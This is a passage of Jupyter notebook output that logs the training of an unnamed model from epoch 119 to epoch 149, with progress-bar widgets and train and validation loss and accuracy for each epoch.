     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:07:26 | INFO | Epoch 119 | Train Loss: 0.5130 | Train Accuracy: 0.8921\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ea710e9bbaf2435ab73c4634e10740a4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:07:27 | INFO | Validation Loss: 0.8955 | Validation Accuracy: 0.7989\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "26465f62ccb84088927f3077f810b5fb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:07:40 | INFO | Epoch 120 | Train Loss: 0.4994 | Train Accuracy: 0.8979\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4d5fdf092709447b83f1ee550bda869d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:07:42 | INFO | Validation Loss: 0.8972 | Validation Accuracy: 0.7923\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ad8be0b528b142f5984a746925f583c1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:07:56 | INFO | Epoch 121 | Train Loss: 0.4931 | Train Accuracy: 0.8979\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "46c6d530f2884538a83251e23081afe6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:07:57 | INFO | Validation Loss: 0.9951 | Validation Accuracy: 0.7900\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9c44476faecd4cea8f441a65c476f167",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:08:10 | INFO | Epoch 122 | Train Loss: 0.5100 | Train Accuracy: 0.8941\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0dad31e9ef884c38894a830083b8dae2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:08:12 | INFO | Validation Loss: 0.8852 | Validation Accuracy: 0.8017\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a87c116a655e4a398039739629747ae0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:08:27 | INFO | Epoch 123 | Train Loss: 0.4955 | Train Accuracy: 0.8970\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "db10404c068a46aea53944fd6d588202",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:08:28 | INFO | Validation Loss: 0.8609 | Validation Accuracy: 0.8267\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fcea65b90a034952b387efad34acfa1d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:08:42 | INFO | Epoch 124 | Train Loss: 0.4856 | Train Accuracy: 0.9003\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1046c494b62143508265d03e23bc16d6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:08:44 | INFO | Validation Loss: 0.9504 | Validation Accuracy: 0.8088\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "22d6e5420b324599abd552f2a619edc0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:08:57 | INFO | Epoch 125 | Train Loss: 0.4877 | Train Accuracy: 0.8999\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "95e48d696e4d4f1f8c6a5f46d0f25544",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:08:58 | INFO | Validation Loss: 0.9705 | Validation Accuracy: 0.7923\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "af3bb6aee78d495e8df6c6a204279164",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:09:12 | INFO | Epoch 126 | Train Loss: 0.4907 | Train Accuracy: 0.8994\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7d956d22ae0a4e619bfe0614a082bfa2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:09:13 | INFO | Validation Loss: 1.0022 | Validation Accuracy: 0.7958\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b00747be359644be9e8d37d32fda0b9d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:09:25 | INFO | Epoch 127 | Train Loss: 0.4971 | Train Accuracy: 0.8985\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "db0216b8073c4df2a909dce35397dc65",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:09:26 | INFO | Validation Loss: 1.0499 | Validation Accuracy: 0.7807\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b994adb7f9ec4401a9769264f4cbf68b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:09:42 | INFO | Epoch 128 | Train Loss: 0.4952 | Train Accuracy: 0.8997\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "81915390dc3d477ab0a9407a39b5f376",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:09:43 | INFO | Validation Loss: 0.8029 | Validation Accuracy: 0.8162\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8c875a2a2966451c850cb8bd5a49a357",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:09:56 | INFO | Epoch 129 | Train Loss: 0.4824 | Train Accuracy: 0.9008\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "12674bbb83864a35a17d3937197111a1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:09:57 | INFO | Validation Loss: 0.8229 | Validation Accuracy: 0.8395\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4a6ac8a306b04d51b823d0e81b1a614c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:10:13 | INFO | Epoch 130 | Train Loss: 0.4577 | Train Accuracy: 0.9065\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f97c0fae17cf45e897ad24a6ee85cf52",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:10:14 | INFO | Validation Loss: 0.9195 | Validation Accuracy: 0.7963\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2704524a7fdf4a6f911cecb0b26b62c1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:10:28 | INFO | Epoch 131 | Train Loss: 0.4703 | Train Accuracy: 0.9057\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cfda9f64e381460480c6e537a3e740c0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:10:29 | INFO | Validation Loss: 0.9819 | Validation Accuracy: 0.8164\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "907c3c3dc3b540dd8f706c1a91636012",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:10:44 | INFO | Epoch 132 | Train Loss: 0.4803 | Train Accuracy: 0.9038\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "25356f4b91e1468893ce6321b4946564",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:10:46 | INFO | Validation Loss: 1.0494 | Validation Accuracy: 0.7894\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2a2b73fc886847b7aa11a880ab8753e5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:11:00 | INFO | Epoch 133 | Train Loss: 0.4763 | Train Accuracy: 0.9040\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5384e5121ab544d2b76082e6f4362e65",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:11:02 | INFO | Validation Loss: 0.9059 | Validation Accuracy: 0.8214\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cae31dfabd2349f68c6856f745a48e11",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:11:17 | INFO | Epoch 134 | Train Loss: 0.4471 | Train Accuracy: 0.9101\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7891d978eeef40fa8b269a218c519f31",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:11:18 | INFO | Validation Loss: 0.8788 | Validation Accuracy: 0.8217\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "626301daa63a4d5583d936b50ca7fed0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:11:30 | INFO | Epoch 135 | Train Loss: 0.4436 | Train Accuracy: 0.9098\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1abe1f86a00f412684acc414ecfeb0bc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:11:32 | INFO | Validation Loss: 0.9042 | Validation Accuracy: 0.8128\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bf8b2081331e4f5b835758a6a593bfd9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:11:44 | INFO | Epoch 136 | Train Loss: 0.4679 | Train Accuracy: 0.9059\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f3ed59571bbb4164bbcd724c2bce4a93",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:11:46 | INFO | Validation Loss: 1.0917 | Validation Accuracy: 0.7828\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7d8663b5317846b48dd64847abcd11ee",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:11:59 | INFO | Epoch 137 | Train Loss: 0.4633 | Train Accuracy: 0.9057\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7da3fe5da19449a39ad1e057f6aea680",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:12:01 | INFO | Validation Loss: 0.9297 | Validation Accuracy: 0.8093\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cdd62b7927dd4495a344aa6a898d2a4d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:12:16 | INFO | Epoch 138 | Train Loss: 0.4730 | Train Accuracy: 0.9037\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dc7d35d628a342e886021564e41f6d0b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:12:17 | INFO | Validation Loss: 1.1019 | Validation Accuracy: 0.7777\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "db28c7db73ca4e08af38391030c6213a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:12:30 | INFO | Epoch 139 | Train Loss: 0.4620 | Train Accuracy: 0.9076\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "12a68e16755f4b45908ed830f1cd8c42",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:12:32 | INFO | Validation Loss: 1.0039 | Validation Accuracy: 0.7969\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "744119fc420e4685bd2d80a084c07ae8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:12:45 | INFO | Epoch 140 | Train Loss: 0.4440 | Train Accuracy: 0.9109\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "de5217f4847f488ebe8d1a1d1979da99",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:12:47 | INFO | Validation Loss: 0.9336 | Validation Accuracy: 0.8096\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9c81df518b76401c8eddd5933ae586be",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:01 | INFO | Epoch 141 | Train Loss: 0.4487 | Train Accuracy: 0.9101\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "33a73737f1b6477da9122d8d3ba93998",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:02 | INFO | Validation Loss: 0.9890 | Validation Accuracy: 0.8045\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4acdf24adf89494692cfd4c16d780308",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:15 | INFO | Epoch 142 | Train Loss: 0.4583 | Train Accuracy: 0.9086\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ffbb8dd15b1a49f0812dc8d1b0589580",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:17 | INFO | Validation Loss: 0.9303 | Validation Accuracy: 0.8040\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "75efd51964684af58c4b6055b2fc3aeb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:29 | INFO | Epoch 143 | Train Loss: 0.4466 | Train Accuracy: 0.9102\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2c52cfab6e79418e8d547f8a230f3154",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:30 | INFO | Validation Loss: 0.8810 | Validation Accuracy: 0.8172\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "575258b93c9248afa7cb3c7e5c5b4cb5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:42 | INFO | Epoch 144 | Train Loss: 0.4637 | Train Accuracy: 0.9071\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3a42c8027d354b0ead79ee0d837b5d6d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:43 | INFO | Validation Loss: 1.1062 | Validation Accuracy: 0.7811\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "322582d41e8e473cbf8118911dd9058a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:54 | INFO | Epoch 145 | Train Loss: 0.4459 | Train Accuracy: 0.9106\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9d530033f76340d284185836b1534b0b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:13:56 | INFO | Validation Loss: 0.9353 | Validation Accuracy: 0.8056\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2d3c61f79d784139bfce88b971ac5364",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:14:07 | INFO | Epoch 146 | Train Loss: 0.4707 | Train Accuracy: 0.9051\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f57eeb62bace4f7799bd53d5470b15a2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:14:08 | INFO | Validation Loss: 1.0234 | Validation Accuracy: 0.8003\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c8bd8d86019a45d38ee29f1f627fbaf6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:14:19 | INFO | Epoch 147 | Train Loss: 0.4678 | Train Accuracy: 0.9064\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9e57d1d622284666a42129c13da5824f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:14:20 | INFO | Validation Loss: 0.9529 | Validation Accuracy: 0.8150\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a043eb81c5c346cdab828f608a46ad99",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:14:31 | INFO | Epoch 148 | Train Loss: 0.4646 | Train Accuracy: 0.9072\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a75c70b47deb4f73b1955518303ce370",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:14:33 | INFO | Validation Loss: 0.9796 | Validation Accuracy: 0.8038\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a2f5edf6d2a14dd982d0f948b64ba556",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 23:14:48 | INFO | Epoch 149 | Train Loss: 0.4704 | Train Accuracy: 0.9039\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "087da1900a8548f7881fc5b24219aca6",
       "version_major": 2,
       "version_minor": 0
      },
